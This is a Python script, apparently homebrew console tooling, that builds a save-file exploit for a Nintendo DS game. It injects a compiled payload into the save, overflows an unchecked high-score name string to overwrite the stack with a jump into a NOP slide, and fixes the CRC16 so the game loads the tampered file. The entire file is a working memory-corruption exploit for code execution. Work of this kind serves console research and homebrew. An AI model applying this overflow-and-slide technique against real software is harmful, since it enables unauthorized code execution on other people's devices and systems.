import sys,struct

slide_start=0x02140104  		#the exact jump address landing location in no$gba seems to be off a bit compared to real hardware. fortunately, there's a huge area of 00000000 nop sliding to work with, so we put this jump address way before our payload to be safe.
payload_location=0x02167C6C   	#this is where our actual payload is in RAM. we slide to it from the above address (this var not used here).
haxstring_file_offset=0x168
crc16_message_len=0x1FC
crc16_location=0x1FC+2
maxsize=0x130  					#the limit of our payload filesize. it might be possible to squeeze a little more, but not much.

def crc16x(data): #CCITT xmodem
	crc=0
	poly=0x1021
	for i in range(len(data)):
		crc^=ord(data[i]) << 8
		for j in range(8):
			if (crc & 0x8000):
				crc=(crc << 1) ^ poly
			else:
				crc=(crc << 1)
	return crc & 0xFFFF	



	
#### let's begin ...... ####
	
with open("payload.bin","rb") as f:						#just getting our armips compiled payload into mem. pretty tight space to work with!
	payload=f.read()
if len(payload) > maxsize:
	print("payload cannot be over 0x130 bytes!\nthe save size is only 0x200 bytes total!")
	exit()

haxstring="Haxxxxxxxxxxxxxxxxxx" 						#there are five consecutive 3-char hardmode highscore names (sav offset 0x168), this overwrites them all as one string.
														#the vuln used here is a null terminated string that is not size verified. as a result, it smashes the stack with our haxstring data.
haxstring+=struct.pack("<I", slide_start) 				#our inexact jump address that lands way before the payload address.
haxstring+=("\x20\xA0\xFF"*14 + "\x20\xA0" + "\x00") 	#the jump address being too close to the string's end will cause it to be overwritten with junk on the stack before the jump. that's why the weird padding is added.
														#also, the 20-a0-ff pattern keeps the excess string length from terminating prematurly. weird.
with open("SYSTEMFLAW.0.sav","rb+") as f:
	print("writing payload to sav ...")
	f.seek(0)
	f.write(payload)
	
	print("writing haxstring to sav ...")
	f.seek(haxstring_file_offset)
	f.write(haxstring)
	
	print("fixing crc16 ...")
	f.seek(0)
	message=f.read(crc16_message_len)
	crc=crc16x(message)
	f.seek(crc16_location)
	prevcrc=struct.unpack("<H",f.read(2))[0]
	if(crc != prevcrc):
		print("0x%04X - crc16 changed, updating..." % prevcrc)
		f.seek(crc16_location)
		f.write(struct.pack("<H",crc))
	else:
		print("no changes")

print("0x%04X" % crc)
print("done")